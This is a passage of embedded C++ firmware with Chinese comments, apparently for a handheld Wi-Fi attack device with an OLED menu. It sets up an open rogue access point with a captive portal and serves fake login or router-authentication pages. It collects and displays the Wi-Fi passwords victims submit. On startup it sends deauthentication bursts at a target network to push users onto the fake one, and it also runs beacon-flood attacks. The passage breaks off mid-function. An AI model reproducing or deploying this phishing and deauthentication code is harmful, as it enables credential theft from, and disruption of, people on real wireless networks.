  while (status != WL_CONNECTED && (millis() - startTs) < AP_START_TIMEOUT_MS) {
    // 优先尝试3参开放式AP
    status = WiFi.apbegin(webtest_ssid_buf, test_channel_str, (uint8_t)0);
    if (status != WL_CONNECTED) {
      // 回退到4参版本，传递NULL密码以显式创建开放AP
      status = WiFi.apbegin(webtest_ssid_buf, (char*)NULL, test_channel_str, (uint8_t)0);
    }
    if (status != WL_CONNECTED) {
      delay(1000);
    }
  }
  if (status == WL_CONNECTED) {
    Serial.println("AP模式启动成功");
    Serial.println("SSID: " + chosenSsid);
    Serial.println("密码: <无密码>");
    Serial.println("信道: " + String(web_test_channel_dynamic));
    IPAddress apIp = WiFi.localIP();
    Serial.print("IP地址: ");
    Serial.println(apIp);

    // 启动DNS和Web服务
    startPhishingServices(apIp);

    startWebUILED();

    Serial.println("钓鱼模式启动完成，等待客户端连接...");
    // 初始化钓鱼去认证诱发计时，并发送一次预突发
    unsigned long nowInit = millis();
    lastPhishingDeauthMs = nowInit;
    lastPhishingBroadcastMs = nowInit;
    if (phishingHasTarget) {
      int packetCount = 0;
      // 使用稳定自动多重攻击逻辑：微秒级帧间隔，循环原因码序列
      const unsigned int interFrameDelayUs = 250;  // 微秒级细微延时，提高吞吐并保持稳定
      sendDeauthBurstToBssidUs(phishingTargetBSSID, perdeauth, packetCount, interFrameDelayUs);
    }
    return true;
  } else {
    Serial.println("AP模式启动失败!");
    return false;
  }
}

// ============ 通用资源清理函数 ============

// 停止Web服务器
void stopWebServer() {
  if (web_server_active) {
    Serial.println("停止Web服务器...");
    web_server.stop();
    web_server_active = false;
  }
}

// 停止DNS服务器
void stopDNSServer() {
  if (dns_server_active) {
    Serial.println("停止DNS服务器...");
    dnsServer.stop();
    dns_server_active = false;
  }
}

// 断开WiFi连接
void disconnectWiFi() {
  Serial.println("断开WiFi连接...");
  WiFi.disconnect();
}

// 清理客户端连接
void cleanupClients(int maxClients = 10) {
  Serial.println("清理客户端连接...");
  for (int i = 0; i < maxClients; i++) {
    WiFiClient client = web_server.available();
    if (client) {
      client.stop();
      delay(10);
    } else {
      break;
    }
  }
}

// 清理钓鱼内存资源
void cleanupPhishingMemory() {
  Serial.println("清理内存资源...");
  web_test_submitted_texts.clear();
  web_test_submitted_texts.shrink_to_fit();
}

// 重置钓鱼状态变量
void resetPhishingState() {
  web_test_active = false;
  // 移除钓鱼功能的一次性状态限制，允许重复启动
  // g_webTestLocked = true;  // 已注释掉，允许重复启动钓鱼功能
  webtest_ui_page = 0;
  webtest_password_scroll = 0;
  webtest_password_cursor = 0;
  webtest_border_always_on = false;
  webtest_flash_remaining_toggles = 0;
  webtest_border_flash_visible = true;
}

// 停止所有攻击进程
void stopAllAttacks() {
  if (deauthAttackRunning) {
    Serial.println("停止解除认证攻击...");
    deauthAttackRunning = false;
    attackstate = 0;
  }
  
  if (beaconAttackRunning) {
    Serial.println("停止信标攻击...");
    beaconAttackRunning = false;
    becaonstate = 0;
  }
}

// 重置WiFi模块
void resetWiFiModule() {
  Serial.println("重置WiFi模块...");
  wifi_off();
  delay(200);
  wifi_on(RTW_MODE_AP);
  delay(200);
}

// 启动钓鱼服务
void startPhishingServices(IPAddress apIp) {
  // 确保服务已停止
  stopDNSServer();
  stopWebServer();
  
  // 启动DNS服务
  dnsServer.setResolvedIP(apIp[0], apIp[1], apIp[2], apIp[3]);
  dnsServer.begin();
  dns_server_active = true;
  
  // 启动Web服务
  web_server.begin();
  web_server_active = true;
  web_test_active = true;
  
  Serial.println("钓鱼服务启动完成");
}

// 启动Web UI服务
void startWebUIServices(IPAddress apIp) {
  // 确保服务已停止
  stopDNSServer();
  stopWebServer();
  
  // 启动DNS服务
  dnsServer.setResolvedIP(apIp[0], apIp[1], apIp[2], apIp[3]);
  dnsServer.begin();
  dns_server_active = true;
  
  // 启动Web服务
  web_server.begin();
  web_server_active = true;
  web_ui_active = true;
  
  Serial.println("Web UI服务启动完成");
}

// 显示钓鱼状态信息
void showPhishingStatus(const String& line1, const String& line2, int delayMs = 2000) {
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  u8g2_for_adafruit_gfx.setCursor(5, 15);
  u8g2_for_adafruit_gfx.print(line1);
  u8g2_for_adafruit_gfx.setCursor(5, 35);
  u8g2_for_adafruit_gfx.print(line2);
  display.display();
  delay(delayMs);
}

// 重启原有AP模式
void restartOriginalAP() {
  Serial.println("重新启动原有AP模式...");
  String channelStr = String(current_channel);
  if (WiFi.apbegin(ssid, pass, (char *)channelStr.c_str())) {
    Serial.println("原有AP模式启动成功");
  } else {
    Serial.println("原有AP模式启动失败");
  }
}

// 检查并清理残留的钓鱼进程
void checkAndCleanupPhishingProcesses() {
  if (web_test_active || web_server_active || dns_server_active) {
    Serial.println("检测到残留的钓鱼进程，强制清理...");
    forceCleanupWebTest();
    delay(500); // 等待清理完成
  }
}

// 钓鱼启动前清理
void cleanupBeforePhishingStart() {
  Serial.println("清理之前的服务...");
  stopWebServer();
  stopDNSServer();
  disconnectWiFi();
  cleanupClients();
  cleanupPhishingMemory();
  
  // 重置钓鱼相关状态变量
  webtest_ui_page = 0;
  webtest_password_scroll = 0;
  webtest_password_cursor = 0;
  webtest_border_always_on = false;
  webtest_flash_remaining_toggles = 0;
  webtest_border_flash_visible = true;
  
  delay(100);
  // 彻底复位到AP模式，防止SDK沿用上次配置导致强制门户失效
  resetWiFiModule();
}

// 停止钓鱼服务（整合所有停止逻辑）
void stopPhishingServices() {
  // 使用通用函数清理资源
  stopAllAttacks();
  stopWebServer();
  stopDNSServer();
  disconnectWiFi();
  cleanupClients();
  cleanupPhishingMemory();
  resetPhishingState();
  closeWebUILED();
  
  // 重置WiFi模块
  resetWiFiModule();
  
  // 恢复原有AP模式
  restartOriginalAP();
  
  // 显示完成信息
  showPhishingStatus("钓鱼功能停止", "相关资源已清理", 2000);
}

// 执行钓鱼功能健康检查
void performPhishingHealthCheck(unsigned long currentTime) {
  static unsigned long last_health_check = 0;
  if (currentTime - last_health_check >= 30000) { // 每30秒检查一次
    last_health_check = currentTime;
    
    // 检查Web服务器和DNS服务器状态
    if (web_test_active && (!web_server_active || !dns_server_active)) {
      Serial.println("检测到钓鱼服务异常，自动清理资源...");
      forceCleanupWebTest();
      return;
    }
    
    // 检查内存使用情况
    if (web_test_submitted_texts.size() > 500) {
      Serial.println("钓鱼文本数据过多，清理旧数据...");
      web_test_submitted_texts.erase(web_test_submitted_texts.begin(), web_test_submitted_texts.begin() + 200);
      web_test_submitted_texts.shrink_to_fit();
    }
  }
}

// 执行Web UI健康检查
void performWebUIHealthCheck(unsigned long currentTime) {
  static unsigned long last_health_check = 0;
  if (currentTime - last_health_check >= 30000) { // 每30秒检查一次
    last_health_check = currentTime;
    
    // 检查Web服务器和DNS服务器状态
    if (web_ui_active && (!web_server_active || !dns_server_active)) {
      Serial.println("检测到Web UI服务异常，自动清理资源...");
      forceCleanupWebUI();
      return;
    }
    
    // 检查Web UI状态一致性
    if (web_ui_active != web_server_active) {
      Serial.println("检测到Web UI状态不一致，自动清理资源...");
      forceCleanupWebUI();
      return;
    }
  }
}

// 检查紧急停止组合键
void checkEmergencyStop() {
  if (digitalRead(BTN_UP) == LOW && digitalRead(BTN_DOWN) == LOW && digitalRead(BTN_OK) == LOW) {
    if (web_test_active) {
      Serial.println("检测到紧急停止组合键，强制清理钓鱼资源...");
      forceCleanupWebTest();
      // 显示紧急停止信息
      showPhishingStatus("紧急停止已执行", "所有资源已清理", 3000);
    } else if (web_ui_active) {
      Serial.println("检测到紧急停止组合键，强制清理Web UI资源...");
      forceCleanupWebUI();
      // 显示紧急停止信息
      showPhishingStatus("Web UI紧急停止", "所有资源已清理", 3000);
    }
    // 等待按键释放
    while (digitalRead(BTN_UP) == LOW || digitalRead(BTN_DOWN) == LOW || digitalRead(BTN_OK) == LOW) {
      delay(10);
    }
  }
}

// 稳定按键状态，为确认弹窗做准备
void stabilizeButtonState() {
  // 等待按键状态稳定
  delay(200);
  // 确保没有按键被按下
  while (digitalRead(BTN_BACK) == LOW || digitalRead(BTN_OK) == LOW || 
         digitalRead(BTN_UP) == LOW || digitalRead(BTN_DOWN) == LOW) {
    delay(10);
  }
  delay(100); // 额外稳定时间
}

// 强制清理所有钓鱼相关资源（紧急清理函数）
void forceCleanupWebTest() {
  Serial.println("=== 强制清理钓鱼资源 ===");
  
  // 使用通用函数清理资源
  stopWebServer();
  stopDNSServer();
  disconnectWiFi();
  cleanupClients(20);
  cleanupPhishingMemory();
  resetPhishingState();
  stopAllAttacks();
  closeWebUILED();
  
  Serial.println("强制清理完成");
}

// 强制清理所有Web UI相关资源（紧急清理函数）
void forceCleanupWebUI() {
  Serial.println("=== 强制清理Web UI资源 ===");
  
  // 使用通用函数清理资源
  stopWebServer();
  stopDNSServer();
  disconnectWiFi();
  cleanupClients(20);
  
  // 重置Web UI状态
  web_ui_active = false;
  g_webUILocked = false;
  
  // 关闭LED
  closeWebUILED();
  
  Serial.println("Web UI强制清理完成");
}
// ============ Web UI 功能 ============

// 启动Web UI
void startWebUI() {
  Serial.println("=== 启动WebUI ===");
  Serial.println("关闭原有AP模式...");
  
  // 预检查：确保没有残留的Web UI进程
  if (web_ui_active || web_server_active || dns_server_active) {
    Serial.println("检测到残留的Web UI进程，强制清理...");
    forceCleanupWebUI();
    delay(500); // 等待清理完成
  }
  
  // 使用强化的BLE清理，避免与WiFi冲突
  if (!canSafelyStartWiFi()) {
    Serial.println("等待BLE资源完全清理...");
    delay(500); // 额外等待时间
  }
  performCompleteBleCleanup();
  
  // 检查是否需要应急恢复
  if (scan_results.empty()) {
    Serial.println("检测到扫描结果为空，执行应急恢复...");
    emergencyWiFiRecovery();
  }
  
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  
  // 显示启动信息
  u8g2_for_adafruit_gfx.setCursor(5, 15);
  u8g2_for_adafruit_gfx.print("正在启动Web UI...");
  display.display();
  
  // 使用通用函数清理之前的服务
  Serial.println("清理之前的服务...");
  stopWebServer();
  stopDNSServer();
  disconnectWiFi();
  cleanupClients();
  
  // 硬复位WiFi到AP模式，避免SDK沿用上次密码配置
  resetWiFiModule();
  
  // 启动WebUI专用AP模式
  Serial.println("启动WebUI专用AP模式...");
  char channel_str[4];
  sprintf(channel_str, "%d", WEB_UI_CHANNEL);
  if (WiFi.apbegin(WEB_UI_SSID, WEB_UI_PASSWORD, channel_str, 0)) {
    Serial.println("WebUI AP模式启动成功");
    Serial.println("SSID: " + String(WEB_UI_SSID));
    Serial.println("密码: " + String(WEB_UI_PASSWORD));
    Serial.println("信道: " + String(WEB_UI_CHANNEL));
    IPAddress apIp = WiFi.localIP();
    Serial.print("IP地址: ");
    Serial.println(apIp);
    
    // 启动Web UI服务
    startWebUIServices(apIp);
    
    // 设置WebUI锁定标志，防止再次启动AP模式
    g_webUILocked = true;
    
    // LED控制：绿灯常亮
    startWebUILED();
    
    // 显示运行状态（按需求格式，SSID/密码居中或滚动）
    display.clearDisplay();
    {
      const char* line1 = "192.168.1.1";
      int w1 = u8g2_for_adafruit_gfx.getUTF8Width(line1);
      int x1 = (display.width() - w1) / 2; if (x1 < 0) x1 = 0;
      u8g2_for_adafruit_gfx.setCursor(x1, 10);
      u8g2_for_adafruit_gfx.print(line1);
    }
    // SSID 行
    {
      String ssidLine = String("SSID: ") + String(WEB_UI_SSID);
      int textW = u8g2_for_adafruit_gfx.getUTF8Width(ssidLine.c_str());
      const int y = 25;
      int x = 0;
      if (textW <= display.width() - 2) {
        x = (display.width() - textW) / 2; if (x < 0) x = 0;
        u8g2_for_adafruit_gfx.setCursor(x, y);
        u8g2_for_adafruit_gfx.print(ssidLine);
      } else {
        // 初次显示也采用滚动窗口方式，从0偏移开始
        int startX = 0;
        u8g2_for_adafruit_gfx.setCursor(2 - startX, y);
        u8g2_for_adafruit_gfx.print(ssidLine);
        u8g2_for_adafruit_gfx.setCursor(2 - startX + textW + 16, y);
        u8g2_for_adafruit_gfx.print(ssidLine);
      }
    }
    // 密码 行
    {
      String pwdLine = String("密码: ") + String(WEB_UI_PASSWORD);
      int textW = u8g2_for_adafruit_gfx.getUTF8Width(pwdLine.c_str());
      const int y = 40;
      int x = 0;
      if (textW <= display.width() - 2) {
        x = (display.width() - textW) / 2; if (x < 0) x = 0;
        u8g2_for_adafruit_gfx.setCursor(x, y);
        u8g2_for_adafruit_gfx.print(pwdLine);
      } else {
        int startX = 0;
        u8g2_for_adafruit_gfx.setCursor(2 - startX, y);
        u8g2_for_adafruit_gfx.print(pwdLine);
        u8g2_for_adafruit_gfx.setCursor(2 - startX + textW + 16, y);
        u8g2_for_adafruit_gfx.print(pwdLine);
      }
    }
    {
      const char* line4 = "按下BACK退出";
      int w4 = u8g2_for_adafruit_gfx.getUTF8Width(line4);
      int x4 = (display.width() - w4) / 2; if (x4 < 0) x4 = 0;
      u8g2_for_adafruit_gfx.setCursor(x4, 55);
      u8g2_for_adafruit_gfx.print(line4);
    }
    display.display();
    
    Serial.println("WebUI启动完成，等待客户端连接...");
    delay(3000);
  } else {
    Serial.println("WebUI AP模式启动失败!");
    display.clearDisplay();
    u8g2_for_adafruit_gfx.setCursor(5, 25);
    u8g2_for_adafruit_gfx.print("Web UI启动失败!");
    display.display();
    delay(2000);
  }
}

// 停止Web UI
void stopWebUI() {
  if (web_ui_active) {
    Serial.println("=== 关闭WebUI ===");
    
    // 使用通用函数停止服务
    stopWebServer();
    stopDNSServer();
    disconnectWiFi();
    cleanupClients();
    
    // 重置Web UI状态
    web_ui_active = false;
    g_webUILocked = false;
    
    // LED控制：绿灯关闭
    closeWebUILED();
    
    // 重置WiFi模块
    resetWiFiModule();
    
    // 重新启动原有AP模式
    restartOriginalAP();
    
    // 显示完成信息
    showPhishingStatus("Web UI已停止", "所有资源已清理", 2000);
    
    Serial.println("WebUI关闭完成，所有资源已清理");
  }
}

// 停止Web Test
void stopWebTest() {
  if (web_test_active) {
    Serial.println("=== 停止钓鱼 ===");
    
    // 使用通用函数停止钓鱼
    stopPhishingServices();
    
    Serial.println("钓鱼模式停止完成，所有资源已清理");
  }
}

// 处理Web Test客户端请求
void handleWebTestClient(WiFiClient& client) {
  String request = "";
  unsigned long timeout = millis() + 3000;
  while (client.connected() && millis() < timeout) {
    if (client.available()) {
      char c = client.read();
      request += c;
      if (request.endsWith("\r\n\r\n")) break;
    }
    delay(1);
  }

  String method = "GET";
  String path = "/";
  int firstSpace = request.indexOf(' ');
  int secondSpace = request.indexOf(' ', firstSpace + 1);
  if (firstSpace > 0 && secondSpace > firstSpace) {
    method = request.substring(0, firstSpace);
    path = request.substring(firstSpace + 1, secondSpace);
  }

  // 读取POST请求体（用于 /auth）
  String body = "";
  if (method == "POST") {
    int contentLengthPos = request.indexOf("Content-Length: ");
    if (contentLengthPos >= 0) {
      int contentLengthEnd = request.indexOf("\r\n", contentLengthPos);
      if (contentLengthEnd > contentLengthPos) {
        String contentLengthStr = request.substring(contentLengthPos + 16, contentLengthEnd);
        int contentLength = contentLengthStr.toInt();
        if (contentLength > 0) {
          unsigned long bodyTimeout = millis() + 2000;
          while (client.available() < contentLength && millis() < bodyTimeout) {
            delay(1);
          }
          for (int i = 0; i < contentLength && client.available(); i++) {
            body += (char)client.read();
          }
          request += body;
        }
      }
    }
  }

  // Captive Portal 常见探测端点：返回200并刷新到根，促使系统弹出门户
  if (path == "/generate_204" || path == "/gen_204" || path == "/ncsi.txt" || path == "/hotspot-detect.html" || path.startsWith("/connecttest.txt") || path.startsWith("/library/test/success.html") || path.startsWith("/success.txt")) {
    String body = "<html><head><meta http-equiv=\"refresh\" content=\"0; url=/\"></head><body></body></html>";
    String hdr = "HTTP/1.1 200 OK\r\n";
    hdr += "Content-Type: text/html\r\n";
    hdr += "Cache-Control: no-cache\r\n";
    hdr += "Content-Length: " + String(body.length()) + "\r\n";
    hdr += "Connection: close\r\n\r\n";
    client.print(hdr);
    client.print(body);
  }
  else if (path == "/" || path == "/index.html") {
    // 根据选择的AP页面类型返回对应HTML
    String header = "HTTP/1.1 200 OK\r\n";
    header += "Content-Type: text/html; charset=UTF-8\r\n";
    header += "Cache-Control: public, max-age=300\r\n";
    switch (g_apSelectedPage) {
      case AP_WEB_TEST:
        {
          size_t pageLen = strlen_P(WEB_AUTH1_HTML);
          header += "Content-Length: " + String(pageLen) + "\r\n";
          header += "Connection: close\r\n\r\n";
          client.print(header);
          client.print(F(WEB_AUTH1_HTML));
        }
        break;
      case AP_WEB_ROUTER_AUTH:
      default: {
        // 将模板中的 {SSID} 替换为实际SSID，避免前端JS动态获取
        String page = FPSTR(WEB_AUTH2_HTML);
        page.replace("{SSID}", String(web_test_ssid_dynamic));
        header += "Content-Length: " + String(page.length()) + "\r\n";
        header += "Connection: close\r\n\r\n";
        client.print(header);
        client.print(page);
        break;
      }
    }
  } else if (path == "/status") {
    handleStatusRequest(client);
  
  } else if (path == "/auth" && method == "POST") {
    // 解析极简JSON {"text":"..."}
    String text = "";
    int tPos = body.indexOf("\"text\":");
    if (tPos >= 0) {
      int firstQuote = body.indexOf('"', tPos + 6);
      if (firstQuote >= 0) {
        int secondQuote = body.indexOf('"', firstQuote + 1);
        if (secondQuote > firstQuote) {
          text = body.substring(firstQuote + 1, secondQuote);
        }
      }
    }
    // 存储提交的文本
    if (text.length() > 0) {
      web_test_submitted_texts.push_back(text);
      if (!webtest_border_always_on) {
        // 第一次收到密码：开启常亮
        webtest_border_always_on = true;
        webtest_flash_remaining_toggles = 0;
        webtest_border_flash_visible = true;
      } else {
        // 后续收到密码：触发两下闪烁（4次可见性翻转）
        webtest_flash_remaining_toggles = 4;
        webtest_last_flash_toggle_ms = millis();
        // 立即开始闪烁：从"熄灭"开始更明显
        webtest_border_flash_visible = false;
      }
      // 最多保留较多条目，避免占用内存过大
      if (web_test_submitted_texts.size() > 200) {
        web_test_submitted_texts.erase(web_test_submitted_texts.begin(), web_test_submitted_texts.begin() + 50);
      }
    }

    String body = "{\"success\":true}";
    String hdr = "HTTP/1.1 200 OK\r\n";
    hdr += "Content-Type: application/json\r\n";
    hdr += "Cache-Control: no-cache\r\n";
    hdr += "Content-Length: " + String(body.length()) + "\r\n";
    hdr += "Connection: close\r\n\r\n";
    client.print(hdr);
    client.print(body);
  } else {
    String hdr = "HTTP/1.1 302 Found\r\n";
    hdr += "Location: /\r\n";
    hdr += "Cache-Control: no-cache\r\n";
    hdr += "Connection: close\r\n\r\n";
    client.print(hdr);
  }
  client.stop();
}

// 发送Web Test页面
void sendWebTestPage(WiFiClient& client) {
  String header = "HTTP/1.1 200 OK\r\n";
  header += "Content-Type: text/html; charset=UTF-8\r\n";
  header += "Connection: close\r\n\r\n";
  client.print(header);
  // 兼容旧调用：默认返回选择的页面
  switch (g_apSelectedPage) {
    case AP_WEB_TEST: client.print(F(WEB_AUTH1_HTML)); break;
    case AP_WEB_ROUTER_AUTH:
    default: {
      String page = FPSTR(WEB_AUTH2_HTML);
      page.replace("{SSID}", String(web_test_ssid_dynamic));
      client.print(page);
      break;
    }
  }
}

// OLED：显示AP网页选择菜单（可扩展样式）
bool apWebPageSelectionMenu() {
  // 参考攻击/首页菜单，加入滚动与选择动画，适配128x64三行布局
  int sel = g_apSelectedPage;
  const int RECT_H = HOME_RECT_HEIGHT;
  if (sel < 0 || sel >= AP_MENU_ITEM_COUNT) sel = 0;

  // 添加去抖变量，与首页保持一致
  unsigned long lastUpTime = 0;
  unsigned long lastDownTime = 0;
  
  while (true) {
    unsigned long currentTime = millis();
    if (digitalRead(BTN_BACK) == LOW) { 
      // 等待按键释放，避免主循环立即检测到返回键
      while(digitalRead(BTN_BACK) == LOW) { delay(10); }
      return false; 
    }
    if (digitalRead(BTN_OK) == LOW) { g_apSelectedPage = sel; return true; }
    if (digitalRead(BTN_UP) == LOW) { 
      if (currentTime - lastUpTime <= DEBOUNCE_DELAY) continue;
      if (sel > 0) sel--; 
      lastUpTime = currentTime;
    }
    if (digitalRead(BTN_DOWN) == LOW) { 
      if (currentTime - lastDownTime <= DEBOUNCE_DELAY) continue;
      if (sel < AP_MENU_ITEM_COUNT - 1) sel++; 
      lastDownTime = currentTime;
    }

    // 静态绘制当前页与高亮
    display.clearDisplay();
    display.setTextSize(1);
    g_apBaseStartIndex = 0;
    g_apSkipRelIndex = sel; // 直接用绝对索引作为跳过行
    drawApMenuBase_NoFlush();
    g_apSkipRelIndex = -1;
    // 与基础绘制保持一致的起始Y偏移（参考频段选择页面）
    int y = 20 + sel * HOME_ITEM_HEIGHT;
    display.drawRoundRect(0, y, display.width() - UI_RIGHT_GUTTER, RECT_H, 4, SSD1306_WHITE);
    // 选中项文字在选择框内向下偏移1像素
    {
      int textY = y + 13; // 原为 +12，这里 +1
      u8g2_for_adafruit_gfx.setFontMode(1);
      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
      u8g2_for_adafruit_gfx.setCursor(6, textY);
      if (sel >= 0 && sel < AP_MENU_ITEM_COUNT) {
        u8g2_for_adafruit_gfx.print(g_apMenuItems[sel]);
      }
    }
    display.display();
  }
}

// OLED：显示认证文本
void showAuthTextOnOLED(const String& text) {
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  u8g2_for_adafruit_gfx.setCursor(5, 15);
  u8g2_for_adafruit_gfx.print("认证内容:");
  u8g2_for_adafruit_gfx.setCursor(5, 32);
  u8g2_for_adafruit_gfx.print(text);
  u8g2_for_adafruit_gfx.setCursor(5, 55);
  u8g2_for_adafruit_gfx.print("按BACK键返回");
  display.display();
}
// 公共弹窗：居中圆角矩形，黑底，按返回关闭
void showModalMessage(const String& line1, const String& line2) {
  const int rectW = 116;
  const int rectH = 36;
  const int rx = (display.width() - rectW) / 2;
  const int ry = (display.height() - rectH) / 2;
  // 覆盖式绘制：不清屏，先绘制黑色填充矩形，再绘制白色边框
  display.fillRoundRect(rx, ry, rectW, rectH, 4, SSD1306_BLACK);
  display.drawRoundRect(rx, ry, rectW, rectH, 4, SSD1306_WHITE);

  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);

  // 将 line1/line2 组装并进行简单的行宽居中处理
  String message = line1;
  if (line2.length() > 0) message += String("\n") + line2;

  const int paddingX = 6;
  const int maxLineWidth = rectW - paddingX * 2;
  const int lineHeight = 14; // 与菜单一致

  // 拆分为行（仅按换行，不自动换行）
  std::vector<String> lines;
  int start = 0;
  while (start <= (int)message.length()) {
    int nl = message.indexOf('\n', start);
    if (nl < 0) nl = message.length();
    lines.push_back(message.substring(start, nl));
    if (nl >= (int)message.length()) break;
    start = nl + 1;
  }
  if (lines.empty()) lines.push_back("");

  // 垂直居中计算
  int totalTextH = (int)lines.size() * lineHeight;
  int firstBaselineY = ry + (rectH - totalTextH) / 2 + 12; // 基线校正

  // 每行水平居中
  for (size_t i = 0; i < lines.size(); i++) {
    const String& s = lines[i];
    int w = u8g2_for_adafruit_gfx.getUTF8Width(s.c_str());
    if (w > maxLineWidth) w = maxLineWidth;
    int x = rx + (rectW - w) / 2;
    int y = firstBaselineY + (int)i * lineHeight;
    u8g2_for_adafruit_gfx.setCursor(x, y);
    u8g2_for_adafruit_gfx.print(s);
  }
  display.display();

  // 按下任意按键均可关闭，并彻底吞掉本次按键，避免回到上层后被再次触发
  // 等待任意按键按下
  while (digitalRead(BTN_BACK) != LOW && digitalRead(BTN_OK) != LOW && 
         digitalRead(BTN_UP) != LOW && digitalRead(BTN_DOWN) != LOW) { delay(10); }
  // 等待释放
  while (digitalRead(BTN_BACK) == LOW || digitalRead(BTN_OK) == LOW ||
         digitalRead(BTN_UP) == LOW || digitalRead(BTN_DOWN) == LOW) { delay(10); }
  // 额外的稳定释放消抖时间，确保上层逻辑读取不到本次按键
  unsigned long stableStart = millis();
  while (true) {
    bool anyKeyLow = (digitalRead(BTN_BACK) == LOW) || (digitalRead(BTN_OK) == LOW) ||
                     (digitalRead(BTN_UP) == LOW) || (digitalRead(BTN_DOWN) == LOW);
    if (anyKeyLow) {
      stableStart = millis();
    }
    if (millis() - stableStart >= 200) {
      break;
    }
    delay(10);
  }
}

// 确认弹窗：样式复用 showModalMessage，第一行居中，第二行左右各自提示
bool showConfirmModal(const String& line1, const String& leftHint, const String& rightHint) {
  const int rectW = 116;
  const int rectH = 40; // 比信息弹窗稍高以容纳第二行提示
  const int rx = (display.width() - rectW) / 2;
  const int ry = (display.height() - rectH) / 2;

  while (true) {
    // 背景与边框
    display.fillRoundRect(rx, ry, rectW, rectH, 4, SSD1306_BLACK);
    display.drawRoundRect(rx, ry, rectW, rectH, 4, SSD1306_WHITE);

    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);

    // 第一行：居中
    int w = u8g2_for_adafruit_gfx.getUTF8Width(line1.c_str());
    if (w > rectW - 12) w = rectW - 12;
    int line1x = rx + (rectW - w) / 2;
    int line1y = ry + 16; // 顶部内边距后基线
    u8g2_for_adafruit_gfx.setCursor(line1x, line1y);
    u8g2_for_adafruit_gfx.print(line1);

    // 第二行：左提示与右提示
    int hintY = ry + rectH - 8; // 靠底部略上
    // 左侧
    u8g2_for_adafruit_gfx.setCursor(rx + 6, hintY);
    u8g2_for_adafruit_gfx.print(leftHint);
    // 右侧
    int rightW = u8g2_for_adafruit_gfx.getUTF8Width(rightHint.c_str());
    int rightX = rx + rectW - 6 - rightW;
    u8g2_for_adafruit_gfx.setCursor(rightX, hintY);
    u8g2_for_adafruit_gfx.print(rightHint);

    display.display();

    // 交互：BACK 取消，OK 确认
    // 使用更简单可靠的按键检测逻辑
    if (digitalRead(BTN_BACK) == LOW) {
      // 等待BACK键释放
      while (digitalRead(BTN_BACK) == LOW) { delay(10); }
      // 额外消抖时间
      delay(200);
      return false; // 取消
    }
    
    if (digitalRead(BTN_OK) == LOW) {
      // 等待OK键释放
      while (digitalRead(BTN_OK) == LOW) { delay(10); }
      // 额外消抖时间
      delay(200);
      return true; // 确认
    }

    delay(10);
  }
}

// 处理Web UI
void handleWebUI() {
  // 检查按钮操作
  if (digitalRead(BTN_BACK) == LOW) {
    // 稳定按键状态，为确认弹窗做准备
    stabilizeButtonState();
    
    // 显示关闭确认弹窗
    if (showConfirmModal("关闭Web UI")) {
      stopWebUI();
    }
    return;
  }
  
  // 处理Web客户端
  unsigned long currentTime = millis();
  if (currentTime - last_web_check >= WEB_CHECK_INTERVAL) {
    last_web_check = currentTime;
    
    WiFiClient client = web_server.available();
    if (client) {
      handleWebClient(client);
    }
  }
  
  // 执行自定义SSID信标攻击（非阻塞）
  if (beaconAttackRunning) {
    executeCustomBeaconFromWeb();
  }
  
  // 显示状态信息
  static unsigned long last_status_update = 0;
  if (currentTime - last_status_update >= 1000) {
    last_status_update = currentTime;
    displayWebUIStatus();
  }
}

// 处理Web Test
void handleWebTest() {
  // 添加去抖变量，与首页保持一致
  static unsigned long lastUpTime = 0;
  static unsigned long lastDownTime = 0;
  static unsigned long lastBackTime = 0;
  static unsigned long lastOkTime = 0;
  
  // 主导航与页面绘制
  if (webtest_ui_page == 0) {
    drawWebTestMain();
  } else if (webtest_ui_page == 1) {
    drawWebTestInfo();
  } else if (webtest_ui_page == 2) {
    drawWebTestPasswords();
  } else if (webtest_ui_page == 3) {
    drawWebTestStatus();
  }

  // 按键处理
  unsigned long currentTime = millis();
  if (digitalRead(BTN_BACK) == LOW) {
    if (currentTime - lastBackTime <= DEBOUNCE_DELAY) return;
    if (webtest_ui_page == 0) {
      // 在主页面按返回：弹出确认弹窗，确认后才停止WebTest
      // 稳定按键状态，为确认弹窗做准备
      stabilizeButtonState();
      
      bool confirmed = showConfirmModal("确认停止钓鱼");
      if (confirmed) {
        stopWebTest();
      } else {
        // 取消：仅关闭弹窗，不返回上层
      }
    } else if (webtest_ui_page == 1) {
      webtest_ui_page = 0;
    } else if (webtest_ui_page == 2) {
      webtest_ui_page = 0;
      webtest_password_cursor = 0;
      webtest_password_scroll = 0;
    } else if (webtest_ui_page == 3) {
      webtest_ui_page = 0;
    }
    lastBackTime = currentTime;
    return;
  }

  if (digitalRead(BTN_UP) == LOW) {
    if (currentTime - lastUpTime <= DEBOUNCE_DELAY) return;
    if (webtest_ui_page == 0) {
      webtest_ui_page = 1; // 进入接入点信息
    } else if (webtest_ui_page == 1) {
      // 在信息页按UP返回主页
      webtest_ui_page = 0;
    } else if (webtest_ui_page == 2) {
      if (webtest_password_scroll > 0) webtest_password_scroll--;
    } else if (webtest_ui_page == 3) {
      // 在状态页按UP返回主页
      webtest_ui_page = 0;
    }
    lastUpTime = currentTime;
  }
  if (digitalRead(BTN_DOWN) == LOW) {
    if (currentTime - lastDownTime <= DEBOUNCE_DELAY) return;
    if (webtest_ui_page == 0) {
      webtest_ui_page = 3; // 进入运行状态
    } else if (webtest_ui_page == 1) {
      // 信息页按DOWN返回主
      webtest_ui_page = 0;
    } else if (webtest_ui_page == 2) {
      if (web_test_submitted_texts.size() > 0) {
        // 简单滚动：每次向下滚动一行
        if (webtest_password_scroll < (int)web_test_submitted_texts.size() - 1) webtest_password_scroll++;
      }
    } else if (webtest_ui_page == 3) {
      // 状态页按DOWN返回主
      webtest_ui_page = 0;
    }
    lastDownTime = currentTime;
  }
  // 无左右键的板子：用OK进入密码列表，用BACK/OK返回
  // 左键逻辑改为OK在主页面进入密码列表
  if (digitalRead(BTN_OK) == LOW) {
    if (currentTime - lastOkTime <= DEBOUNCE_DELAY) return;
